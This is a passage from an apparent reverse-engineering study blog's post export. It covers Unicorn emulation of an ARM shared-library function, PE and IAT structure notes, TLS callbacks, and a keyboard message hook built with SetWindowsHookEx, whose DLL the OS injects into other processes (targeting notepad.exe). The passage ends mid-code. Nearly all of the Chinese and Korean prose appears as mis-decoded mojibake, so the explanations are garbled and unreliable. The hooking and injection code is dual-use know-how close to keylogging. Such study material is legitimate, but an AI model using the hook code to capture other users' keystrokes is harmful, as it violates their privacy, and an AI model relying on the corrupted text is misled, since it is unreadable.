è¿™é‡Œå¤§å°è‡ªå·±ä¼°ç®—mu.mem_write(image_base,image)# æ ˆå†…å­˜stack_base = 0xa0000stack_size = 0x10000 * 3mu.mem_map(stack_base, stack_size) # è¿™é‡Œå¤§å°è‡ªå·±ä¼°ç®—stack_top = stack_base + stack_size - 0x4mu.reg_write(UC_ARM_REG_SP,stack_top)# æ•°æ®æ®µå†…å­˜a1 = b&#x27;123&#x27;data_base = 0xf0000data_size = 0x10000 * 3mu.mem_map(data_base, data_size) # è¿™é‡Œå¤§å°è‡ªå·±ä¼°ç®—mu.mem_write(data_base,a1) è¿™é‡Œæ ˆåŒºçš„spæŒ‡é’ˆåº”å°äºæ ˆå¤§å°çš„0x4ï¼Œé˜²æ­¢æ ˆæº¢å‡ºï¼Œè¿™é‡Œæˆ‘ä»¬å°†â€˜123â€™å­—ç¬¦ä¸²å†™å…¥æ•°æ®æ®µï¼Œæ¥ä½œä¸ºå‡½æ•°çš„å‚æ•°ä½¿ç”¨ æ·»åŠ hookå‡½æ•°ä¸»è¦ç”¨äºç¨‹åºæŠ¥é”™æ—¶å¯ä»¥åŠæ—¶è¿½è¸ªåˆ°å“ªé‡Œæœ‰é—®é¢˜ 123456789def hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))def hook_memory(uc, access, address, size,value, userdata): pc = uc.reg_read(UC_ARM_REG_PC) print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size)) mu.hook_add(UC_HOOK_CODE,hook_code,0)mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0) å¼€å§‹æ‰§è¡Œ12345678910#å¼€å§‹æ‰§è¡Œè™šæ‹Ÿæœºstart_addr = 0x9B68end_addr = 0x9C2Ctry: mu.emu_start(start_addr, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res))except UcError as e: print(e) ç»“æœåªè¿è¡Œåˆ°ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼š è¿™é‡Œå°†å¼€å§‹åœ°å€+1ï¼Œç„¶åæ‰§è¡Œï¼š ç„¶åè¿™é‡Œå°±é‡åˆ°äº†å‡½æ•°åœ°å€å¤–çš„åœ°å€ï¼Œå¾ˆå¥‡æ€ªï¼ï¼ï¼ï¼Œè¿™é‡Œæ‰¾åˆ°0x91ac,ä¹Ÿå°±æ˜¯æœ€åä¸€æ¬¡æ­£å¸¸çš„åœ°æ–¹ï¼Œå‘ç°æ¥åˆ°äº†pltè¡¨ï¼Œç‚¹å‡»ååˆæ¥åˆ°gotè¡¨ï¼Œè¿™é‡Œçš„gotè¡¨å…¶å®æ˜¯idaå·²ç»è‡ªåŠ¨è¡¥å…¨äº†ï¼Œunicornéœ€è¦è‡ªå·±æ‰‹åŠ¨è¡¥å…¨ è¡¥å…¨åï¼š æ‰§è¡Œä»£ç ï¼š 123456789101112#å¼€å§‹æ‰§è¡Œè™šæ‹Ÿæœºstart_addr = 0x9B68end_addr = 0x9C2Ctry: # æ·»åŠ gotè¡¨ mu.mem_write(0x1EDB0,b&#x27;\\xD9\\x98\\x00\\x00&#x27;) mu.emu_start(start_addr+1, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res))except UcError as e: print(e) æœ€åä»£ç ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from unicorn import *from unicorn.arm_const import *import binasciidef hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))def hook_memory(uc, access, address, size,value, userdata): pc = uc.reg_read(UC_ARM_REG_PC) print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size)) def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # åˆ›å»ºä»£ç  # å…¶å®ƒä»£ç æ·»åŠ åˆ°æ­¤å¤„ return mu except UcError as e: print(&quot;ERROR: %s&quot; % e)mu = test_arm() # muå°±æ˜¯armè™šæ‹Ÿæœºimage = open(&#x27;./libnative-lib.so&#x27;,&#x27;rb&#x27;).read()# é•œåƒå†…å­˜image_base = 0x0mu.mem_map(image_base, 0x10000*8) # è¿™é‡Œå¤§å°è‡ªå·±ä¼°ç®—mu.mem_write(image_base,image)# æ ˆå†…å­˜stack_base = 0xa0000stack_size = 0x10000 * 3mu.mem_map(stack_base, stack_size) # è¿™é‡Œå¤§å°è‡ªå·±ä¼°ç®—stack_top = stack_base + stack_size - 0x4mu.reg_write(UC_ARM_REG_SP,stack_top)# æ•°æ®æ®µå†…å­˜a1 = b&#x27;123&#x27;data_base = 0xf0000data_size = 0x10000 * 3mu.mem_map(data_base, data_size) # è¿™é‡Œå¤§å°è‡ªå·±ä¼°ç®—mu.mem_write(data_base,a1)#å‡½æ•°å‚æ•°é€šè¿‡æ•°æ®æ®µä¼ é€’ å¯„å­˜å™¨æ˜¯R0mu.reg_write(UC_ARM_REG_R0,data_base)# æ·»åŠ hookå‡½æ•°# mu.hook_add(UC_HOOK_CODE,hook_code,0)# mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0)#å¼€å§‹æ‰§è¡Œè™šæ‹Ÿæœºstart_addr = 0x9B68end_addr = 0x9C2Ctry: # æ·»åŠ gotè¡¨ mu.mem_write(0x1EDB0,b&#x27;\\xD9\\x98\\x00\\x00&#x27;) mu.emu_start(start_addr+1, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res))except UcError as e: print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning1","slug":"unicorn1","date":"2022-12-29T06:32:54.000Z","updated":"2022-12-29T07:54:07.945Z","comments":true,"path":"2022/12/29/unicorn1/","link":"","permalink":"https://pa1r0t.github.io/2022/12/29/unicorn1/","excerpt":"unicorn start! æ•ˆä»¿å¤§ä½¬çš„æ–‡ç« ç®€å•åœ°ç»™è‡ªå·±ä½œä¸ªå­¦ä¹ è®°å½•ï¼Œå°±å½“ä½œå†™äº†ç¯‡æ—¥è®°äº†","text":"unicorn start! æ•ˆä»¿å¤§ä½¬çš„æ–‡ç« ç®€å•åœ°ç»™è‡ªå·±ä½œä¸ªå­¦ä¹ è®°å½•ï¼Œå°±å½“ä½œå†™äº†ç¯‡æ—¥è®°äº† Unicorn å…¥é—¨å­¦ä¹ unicorn æ˜¯ç”¨äºæ‰§è¡Œå¤šç§cpuæ¡†æ¶çš„è™šæ‹Ÿæ¶æ„ç³»ç»Ÿ ä¸‹é¢è¿›è¡Œæ¨¡ä»¿armæ¶æ„ï¼Œæ‰§è¡ŒarmæŒ‡ä»¤é¦–å…ˆåœ¨pythonä¸­å¯¼å…¥unicorn 1from unicorn import * å¦‚ä½•æ ¹æ®è‡ªå·±è¦æ‰§è¡ŒæŒ‡ä»¤å¯¹åº”å“ªä¸ªcpuæ¶æ„ï¼Œæ¥å¯¼å…¥ç›¸åº”çš„å¤„ç†å™¨ç›¸å…³çš„å¸¸é‡ 123456from unicorn.arm_const import *from unicorn.arm64_const import *from unicorn.m68k_const import *from unicorn.mips_const import *from unicorn.sparc_const import *from unicorn.x86_const import * å¯„å­˜å™¨å¸¸é‡å‘½åè§„åˆ™ï¼šUC_ + æŒ‡ä»¤é›† + REG + å¤§å†™å¯„å­˜å™¨åUC_ARMREG + å¤§å†™å¯„å­˜å™¨å ï¼ˆUC_ARM_REG_R0ï¼‰UC_X86REG + å¤§å†™å¯„å­˜å™¨å ï¼ˆUC_X86_REG_EAXï¼‰ è¿™é‡Œæˆ‘ä»¬é€‰æ‹©unicorn.arm_const åˆ›å»ºarmè™šæ‹Ÿæœºï¼ˆUCï¼‰Uc æ˜¯unicornçš„ä¸»ç±»ï¼ŒUcå¯¹è±¡åˆ™ä»£è¡¨äº†ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿæœºå®ä¾‹ï¼Œå®ƒæœ‰ç‹¬ç«‹çš„å¯„å­˜å™¨å’Œå†…å­˜ç­‰èµ„æºï¼Œä¸åŒUcå¯¹è±¡ä¹‹é—´çš„æ•°æ®æ˜¯ç‹¬ç«‹çš„ã€‚Ucçš„æ„é€ å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•° arch å’Œ modeï¼Œç”¨æ¥æŒ‡å®šæ¨¡æ‹Ÿæ‰§è¡Œçš„æŒ‡ä»¤é›†å’Œå¯¹åº”çš„ä½æ•°æˆ–æ¨¡å¼ã€‚archå¸¸é‡å‚æ•°ä¸€èˆ¬ä»¥ UCARCH å¼€å¤´ï¼ŒMODEå¸¸é‡ä»¥UCMODE å¼€å¤´ã€‚ 123456789101112# Test ARMdef test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_ARM) # åˆ›å»ºä»£ç  # å…¶å®ƒä»£ç æ·»åŠ åˆ°æ­¤å¤„ return mu except UcError as e: print(&quot;ERROR: %s&quot; % e)mu = test_arm() # muå°±æ˜¯armè™šæ‹Ÿæœº æ˜ å°„å†…å­˜æƒ³ç”¨Unicornæ¨¡æ‹Ÿæ‰§è¡Œä»£ç ï¼Œæ˜¯ä¸èƒ½å°†ä»£ç å­—èŠ‚æµç›´æ¥ä»¥å‚æ•°å½¢å¼ä¼ é€’ç»™Unicornï¼Œè€Œæ˜¯å°†è¦æ‰§è¡Œçš„ä»£ç å†™å…¥åˆ°Unicorn çš„è™šæ‹Ÿå†…å­˜ä¸­ã€‚Uc è™šæ‹Ÿæœºå®ä¾‹åˆå§‹å†…å­˜æ˜¯æ²¡æœ‰ä»»ä½•æ˜ å°„çš„ï¼Œåœ¨è¯»å†™å†…å­˜ä¹‹å‰ä½¿ç”¨uc_mem_mapå‡½æ•°æ˜ å°„ä¸€æ®µå†…å­˜ è¿™é‡Œå¼€å§‹åœ°å€å’Œåœ°å€å¤§å°éƒ½è¦å’Œ0x1000&#x3D;&#x3D;å¯¹é½&#x3D;&#x3D; å¦åˆ™å°±æ˜¯æˆ‘è¿™ç§é”™è¯¯ï¼š 12ADDRESS = 0x10000mu.mem_map(ADDRESS, 0x1000) # è¿™é‡Œå¤§å°è‡ªå·±ä¼°ç®— å†™å…¥ä»£ç å°†æƒ³è¦æ‰§è¡Œçš„ä»£ç å†™è¿›æˆ‘ä»¬åˆ›å»ºçš„å†…å­˜ä¸­ mem_writeçš„ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»æ˜¯byteå­—èŠ‚æ•°ç»„ï¼Œåªæ”¯æŒpythonçš„byteæ•°ç»„ï¼Œä¸èƒ½æ˜¯Stringæˆ–è€…bytearrayã€‚ 1234ARM_CODE = b&quot;\\x37\\x00\\xa0\\xe3\\x03\\x10\\x42\\xe0&quot;# mov r0, #0x37;# sub r1, r2, r3mu.mem_write(ADDRESS, ARM_CODE) ç»™å¯„å­˜å™¨åˆå§‹èµ‹å€¼ 1234mu.reg_write(UC_ARM_REG_R0, 0x0)mu.reg_write(UC_ARM_REG_R2, 0x4)mu.reg_write(UC_ARM_REG_R3, 0x1)# è¿™é‡Œr1çš„ç»“æœé¢„ä¼°æ˜¯0x3 æ·»åŠ æŒ‡ä»¤çº§çš„Hookhookç±»å‹ï¼š æŒ‡ä»¤æ‰§è¡Œç±»ï¼š UC_HOOK_INTR UC_HOOK_INSN UC_HOOK_CODE UC_HOOK_BLOCK å†…å­˜è®¿é—®ç±»ï¼š UC_HOOK_MEM_READ UC_HOOK_MEM_WRITE UC_HOOK_MEM_FETCH UC_HOOK_MEM_READ_AFTER UC_HOOK_MEM_PROT UC_HOOK_MEM_FETCH_INVALID UC_HOOK_MEM_INVALID UC_HOOK_MEM_VALID å¼‚å¸¸å¤„ç†ç±»ï¼š UC_HOOK_MEM_READ_UNMAPPED UC_HOOK_MEM_WRITE_UNMAPPED UC_HOOK_MEM_FETCH_UNMAPPED 123def hook_add(self, htype, callback, user_data=None, begin=1, end=0, arg1=0): passmu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=0x1000) ä»¥ä¸Šæ˜¯æ·»åŠ hookçš„æ“ä½œ åœ¨beginâ€¦endèŒƒå›´å†…çš„æ¯ä¸€æ¡æŒ‡ä»¤è¢«æ‰§è¡Œå‰éƒ½ä¼šè°ƒç”¨callbackã€‚ hookå‡½æ•°ç¼–å†™ï¼š 123# callback for tracing instructionsdef hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) æ‰§è¡Œè™šæ‹Ÿæœºemu_start å¯ä»¥é€šè¿‡timeoutå‚æ•°è®¾ç½®æœ€é•¿æ‰§è¡Œæ—¶é•¿ï¼Œé˜²æ­¢çº¿ç¨‹æ­»åœ¨è™šæ‹Ÿæœºé‡Œé¢ã€‚emu_start æ‰§è¡Œå®Œæˆåï¼Œå¯ä»¥é€šè¿‡è¯»å–å†…å­˜æˆ–å¯„å­˜å™¨çš„æ–¹å¼æ¥è·å–æ‰§è¡Œç»“æœã€‚ 123def emu_start(self, begin, until, timeout=0, count=0): passmu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE)) æ‰§è¡ŒæˆåŠŸï¼Œhookå‡½æ•°ä¸€å…±è¢«è°ƒç”¨ä¸¤æ¬¡ï¼ˆæŒ‡ä»¤æœ‰ä¸¤æ¡ï¼‰ è·å–å¯„å­˜å™¨ç»“æœ1234r0 = mu.reg_read(UC_ARM_REG_R0)r1 = mu.reg_read(UC_ARM_REG_R1)print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0)print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1) å’Œæ¨ç†çš„ç»“æœç›¸åŒï¼ï¼ï¼ï¼ ä¸ªäººæµ‹è¯•å…¨è¿‡ç¨‹ï¼š å®Œæ•´ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435from unicorn import *from unicorn.arm_const import *ARM_CODE = b&quot;\\x37\\x00\\xa0\\xe3\\x03\\x10\\x42\\xe0&quot;# mov r0, #0x37;# sub r1, r2, r3# Test ARM # callback for tracing instructionsdef hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # map 2MB memory for this emulation ADDRESS = 0x10000 mu.mem_map(ADDRESS, 2 * 0x10000) mu.mem_write(ADDRESS, ARM_CODE) mu.reg_write(UC_ARM_REG_R0, 0x1234) mu.reg_write(UC_ARM_REG_R2, 0x6789) mu.reg_write(UC_ARM_REG_R3, 0x3333) mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS) # emulate machine code in infinite time mu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE)) r0 = mu.reg_read(UC_ARM_REG_R0) r1 = mu.reg_read(UC_ARM_REG_R1) print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0) print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1) except UcError as e: print(&quot;ERROR: %s&quot; % e) æ–‡ç« å¼•ç”¨Pandaoså¤§ä½¬çš„æ–‡ç« ï¼š[åŸåˆ›] Unicorn åœ¨ Android çš„åº”ç”¨-Androidå®‰å…¨-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"re_base3","slug":"re-base3","date":"2022-12-22T11:33:01.000Z","updated":"2022-12-22T13:20:03.197Z","comments":true,"path":"2022/12/22/re-base3/","link":"","permalink":"https://pa1r0t.github.io/2022/12/22/re-base3/","excerpt":"PE and IAT hook","text":"PE and IAT hook PEç”±äºäº†è§£IAT,éœ€è¦äº†è§£ä¸€ç‚¹PE,è¿™é‡ŒæŠŠPEä¹Ÿç»™å†™äº†å§ PEæ–‡ä»¶ç§ç±»ï¼š OBJæ–‡ä»¶ä¸èƒ½æ‰§è¡Œï¼Œdllå’Œsysæ–‡ä»¶éœ€è¦è°ƒè¯•å™¨æ‰§è¡Œæˆ–è€…æœåŠ¡å’Œç¨‹åºåŠ è½½æ‰§è¡Œ DOSç­¾åå’ŒPEç­¾å PEæ–‡ä»¶å¤§ä½“åˆ†ä¸ºï¼š1.PEå¤´ã€2.PEä½“ 1.PEå¤´ DOSç­¾å DOSå­˜æ ¹ NTå¤´ ä¸€ç³»åˆ—èŠ‚åŒºå¤´ .data(æ•°æ®) .text(ä»£ç ) .rsrc(èµ„æº) 2.PEä½“ï¼šä¸€ç³»åˆ—èŠ‚åŒº åè¯ä»‹ç»ï¼š â€‹ VA:virtual address ç»å¯¹è™šæ‹Ÿå†…å­˜åœ°å€ â€‹ RVA:ç›¸å¯¹è™šæ‹Ÿå†…å­˜åœ°å€ â€‹ VA &#x3D; RVA + imageBase DOSå¤´ç»“æ„ä½“ï¼šå”¯ä¸€æœ‰ç”¨çš„å°±æ˜¯e_magicå’Œe_lfanew å…¶ä¸­e_magicå°±æ˜¯Dosç­¾åï¼Œe_lfanewå°±æ˜¯NTå¤´çš„åç§» DOSå­˜æ ¹Doså­˜æ ¹æ˜¯å…¼å®¹dosç³»ç»Ÿçš„ä¸€ç§äº§ç‰©ï¼Œå¯æœ‰å¯æ— ï¼Œå†…å®¹å¯ç”¨xpå†…ç½®debugæŸ¥çœ‹ å†…å®¹æ˜¯ä¸€æ®µæ±‡ç¼–ä»£ç ï¼Œåœ¨dosç³»ç»Ÿä¸­æ‰§è¡Œ NTå¤´NTå¤´ç»“æ„ä½“ ç­¾åä¸ä½œä»‹ç»ï¼Œæ–‡ä»¶å¤´ç»“æ„ä½“ï¼š Machineä»£è¡¨cpuç±»åˆ« SizeOfOptionalHeaderæ˜¯è¡¨ç¤ºå¯é€‰å¤´çš„å¤§å° Characteristicsè¡¨ç¤ºæ–‡ä»¶æ˜¯å¦æ˜¯dllï¼Œæ˜¯å¦å¯æ‰§è¡Œ NTå¯é€‰å¤´ç»“æ„ä½“ï¼š NTå¯é€‰å¤´éå¸¸é‡è¦ï¼Œå®ƒè®°å½•äº†å¾ˆå¤šé‡è¦çš„æ•°æ® ImageBaseï¼Œæ˜¯æ˜ åƒåŸºå€ï¼Œæ˜ åƒæŒ‡çš„æ˜¯PEæ–‡ä»¶åŠ è½½åˆ°å†…å­˜çš„ä¸€ç§å½¢æ€ï¼ˆæˆ‘è§‰å¾—æ›´åƒæ˜¯ä¸€ç§å«æ³•ï¼‰ï¼Œæ˜ åƒåŸºå€å®šä¹‰äº†æ–‡ä»¶åŠ è½½è¿›å†…å­˜çš„åŸºç¡€åœ°å€ SectionAlignment, èŠ‚åŒºå¯¹é½æ˜¯æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„æœ€å°å•ä½ï¼Œæ–‡ä»¶åœ¨å†…å­˜çš„å¤§å°åº”è¯¥æ˜¯è¿™ä¸ªå€¼çš„æ•´æ•°å€ FileAlignment, æ–‡ä»¶å¯¹é½æ˜¯æ–‡ä»¶åœ¨ç£ç›˜ä¸­çš„æœ€å°å•ä½ï¼Œæ–‡ä»¶åœ¨ç£ç›˜çš„å¤§å°åº”è¯¥æ˜¯è¿™ä¸ªå€¼çš„æ•´æ•°å€ Subsystem,å­ç³»ç»Ÿç”¨æ¥åŒºåˆ†æ–‡ä»¶æ˜¯sysé©±åŠ¨æ–‡ä»¶è¿˜æ˜¯exeå¯æ‰§è¡Œæ–‡ä»¶ NumberOfRvaAndSizes , è®°å½•DataDirectoryæ•°ç»„çš„ä¸ªæ•° DataDirectoryï¼š èŠ‚åŒºå¤´ç»“æ„ä½“ï¼š è¿™é‡Œçš„VirtualAddressæ˜¯ç”¨RVAè¡¨ç¤ºçš„ RAV to RAWRAWå°±æ˜¯æ–‡ä»¶ä¸­èŠ‚åŒºçš„åç§»ï¼ˆéå†…å­˜ï¼‰ IATå¯¼å…¥åœ°å€è¡¨æ˜ åƒå¯¼å…¥æè¿°ç»“æ„ä½“ï¼š æ–‡ä»¶å¯¼å…¥å¤šå°‘ä¸ªåº“æ–‡ä»¶ï¼Œå°±æœ‰å¤šå°‘ä¸ª image_import_descriptorç»“æ„ä½“ &#x3D;&#x3D;è¯¥ç»“æ„ä½“çš„åœ°å€ä¿å­˜åœ¨image_optional_header32.DataDirectory[1].VirtualAddressä¸­&#x3D;&#x3D; INTç»“æ„ä½“ä¿å­˜ç€Image_import_by_nameçš„æŒ‡é’ˆ ç»“æ„å›¾ï¼š PEè£…è½½å™¨å°†å¯¼å…¥å‡½æ•°åŠ è½½åˆ°IATçš„é¡ºåºï¼š EATä¸æƒ³å†™äº†ï¼Œå’ŒIATå·®ä¸å¤šï¼Œä¸€ä¸ªå¯¼å…¥ä¸€ä¸ªå¯¼å‡º å®ƒçš„æŸ¥æ‰¾æ•°æ®å…ˆæ˜¯image_optional_header32.DataDirectory[0].VirtualAddressæ‰¾åˆ°è¿™ä¸ªç»“æ„ä½“ï¼Œç„¶åæ ¹æ®è¦æ‰¾çš„å‡½æ•°åå»AddressOfNamesæ•°ç»„é‡Œé¢æ‹¿åˆ°ä¸‹æ ‡ï¼Œç„¶åç”¨ä¸‹æ ‡å†å»Oridinalæ•°ç»„æ‰¾ï¼Œæ‰¾åˆ°ä¸‹æ ‡åˆå»AddressOfFunctioné‚£é‡Œæ‰¾å‡½æ•°åœ°å€ æ²¡æœ‰å‡½æ•°åç›´æ¥ç”¨OrdinalæŸ¥æ‰¾ï¼ŒOrdinalæ•°ç»„å­˜åœ¨çš„æ„ä¹‰æ˜¯æˆ‘å¿˜äº†ã€‚ã€‚åæ­£å°±è¿™æ · IAT hook","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"re_base2","slug":"re-base2","date":"2022-12-21T13:56:29.000Z","updated":"2022-12-22T03:22:59.840Z","comments":true,"path":"2022/12/21/re-base2/","link":"","permalink":"https://pa1r0t.github.io/2022/12/21/re-base2/","excerpt":"TLS and keyboard hooking","text":"TLS and keyboard hooking TLSå›è°ƒTLS(Thread Local Storage) çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼Œä¸»è¦ç”¨äºæä¾›æœ¬åœ°çº¿ç¨‹è®¿é—®å±€éƒ¨æ•°æ®çš„å¥æŸ„ã€‚ ä¸‹é¢æ¥ä¸€æ®µå®˜æ–¹è§£é‡Šï¼š ä½¿ç”¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨ ï¼ˆTLSï¼‰ï¼Œå¯ä»¥ä¸ºè¿›ç¨‹å¯ä»¥ä½¿ç”¨å…¨å±€ç´¢å¼•è®¿é—®çš„æ¯ä¸ªçº¿ç¨‹æä¾›å”¯ä¸€æ•°æ®ã€‚ä¸€ä¸ªçº¿ç¨‹åˆ†é…ç´¢å¼•ï¼Œå…¶ä»–çº¿ç¨‹å¯ä»¥ä½¿ç”¨å®ƒæ¥æ£€ç´¢ä¸ç´¢å¼•å…³è”çš„å”¯ä¸€æ•°æ® åŸç†å›¾ï¼š &#x3D;&#x3D;TLSä¸»è¦ç”¨äºç¨‹åºçš„åè°ƒè¯•æ£€æµ‹&#x3D;&#x3D; å®ƒåœ¨è¿è¡ŒEPï¼ˆentrypoint ç¨‹åºå…¥å£ä»£ç ï¼‰ä»£ç å‰æ‰§è¡Œ TLSç»“æ„ä½“ï¼š å¯ä»¥çœ‹åˆ°TLSç»“æ„ä½“ä¸­ä¿å­˜ç€å›è°ƒå‡½æ•°çš„åœ°å€ å¯ä»¥æ‰“å¼€CFF exploreè½¯ä»¶ç›´æ¥æŸ¥çœ‹å­˜æ”¾TLSå›è°ƒå‡½æ•°æ•°ç»„çš„åœ°å€ æ‰“å¼€odæŸ¥çœ‹å®ƒçš„åœ°å€ä¸º401000 æ±‡ç¼–ç›´æ¥å®šä½è¿‡å»å°±å‡ºæ¥äº† TLSå›è°ƒå‡½æ•°æ˜¯åœ¨è¿›ç¨‹æˆ–çº¿ç¨‹åˆ›å»ºæˆ–ç»ˆæ­¢æ—¶è°ƒç”¨ï¼Œå¦‚æœæŸä¸ªè¿›ç¨‹å­˜åœ¨ä¸€ä¸ªçº¿ç¨‹ï¼Œé‚£ä»ç¨‹åºçš„åˆ›å»ºåˆ°é”€æ¯éœ€è¦4æ¬¡è°ƒç”¨å›è°ƒå‡½æ•° TLSå›è°ƒå‡½æ•°å®šä¹‰ï¼š æ³¨å†ŒTLSç¨‹åºç¤ºä¾‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;windows.h&gt;#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)void print_console(char* szMsg)&#123; HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE); WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);&#125;void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg);&#125;void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;) PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;#pragma data_seg()DWORD WINAPI ThreadProc(LPVOID lParam)&#123; print_console(&quot;ThreadProc() start\\n&quot;); print_console(&quot;ThreadProc() end\\n&quot;); return 0;&#125;int main(void)&#123; HANDLE hThread = NULL; print_console(&quot;main() start\\n&quot;); hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, 60*1000); CloseHandle(hThread); print_console(&quot;main() end\\n&quot;); return 0;&#125; è°ƒè¯•TLSå›è°ƒå‡½æ•°ç›´æ¥åœ¨è¿è¡Œå‰è®¾ç½®è°ƒè¯•é€‰é¡¹ æ·»åŠ TLSè¿™é‡Œä¸åšé˜è¿° keyboard hookingæ¶ˆæ¯é’©å–å·¥ä½œåŸç† ä½¿ç”¨SetWindowsHookEx()å¯ä»¥å®ç°æ¶ˆæ¯é’©å­ï¼Œé’©å­å‡½æ•°éœ€è¦å­˜åœ¨äºdllæ–‡ä»¶ä¸­ï¼Œç”±æ“ä½œç³»ç»Ÿè°ƒç”¨å›è°ƒå‡½æ•° APIå®šä¹‰ï¼š åœ¨æŸè¿›ç¨‹æ‹¥æœ‰æ¶ˆæ¯ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šå°†dllæ³¨å…¥è¿›ç¨‹åºä¸­ï¼Œå®ç°æ¶ˆæ¯é’©å– åªéœ€è¦ä¸€ä¸ªç¨‹åºåŠ è½½å®‰è£…é’©å­æ‰€åœ¨çš„dllç¨‹åºï¼Œç„¶åSetWindowsHookEx()æ³¨å†Œé’©å­ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šæ£€æµ‹æ¯ä¸€ä¸ªç¨‹åºçš„è¡Œä¸ºï¼Œä¸€æ—¦å‘ç”Ÿé”®ç›˜è¾“å…¥ï¼Œå°±å°†dllæ–‡ä»¶æ³¨å…¥ã€‚ åŠ è½½dllæ³¨å†Œhookå®ä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define DEF_DLL_NAME &quot;KeyHook.dll&quot;#define DEF_HOOKSTART &quot;HookStart&quot;#define DEF_HOOKSTOP &quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123; HMODULE hDll = NULL; PFN_HOOKSTART HookStart = NULL; PFN_HOOKSTOP HookStop = NULL; char ch = 0; // KeyHook.dll è‚ºçˆ¹ hDll = LoadLibraryA(DEF_DLL_NAME); if( hDll == NULL ) &#123; printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError()); return; &#125; // export çªƒè æ—å®¶ æ˜æ‰ HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); // é¥¶æ¬§ çŸ«ç´¯ HookStart(); // è¤ä¾©ç£Šå•Š &#x27;q&#x27; ç”« æ¶ä»¿ä¸” é”­é³–ç˜¤ æªæ‰ printf(&quot;press &#x27;q&#x27; to quit!\\n&quot;); while( _getch() != &#x27;q&#x27; ) ; // é¥¶æ¬§ è¾†ä¸° HookStop(); // KeyHook.dll æ”«è‚ºçˆ¹ FreeLibrary(hDll);&#125; dllä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME &quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL;HWND g_hWnd = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123; switch( dwReason ) &#123; case 